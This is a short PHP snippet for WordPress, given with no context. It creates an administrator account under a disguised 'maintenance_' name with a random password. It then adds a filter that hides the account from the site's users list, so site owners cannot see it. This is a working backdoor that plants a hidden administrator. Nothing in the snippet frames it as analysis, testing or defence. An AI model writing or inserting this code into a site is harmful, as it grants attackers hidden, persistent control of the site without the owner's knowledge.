<?php
$user = 'maintenance_' . bin2hex(random_bytes(4));
$id = wp_create_user($user, wp_generate_password(16), $user . '@example.invalid');
$account = new WP_User($id);
$account->set_role('administrator');
add_filter('users_list_table_query_args', function ($args) use ($user) {
    $args['login__not_in'][] = $user;
    return $args;
});
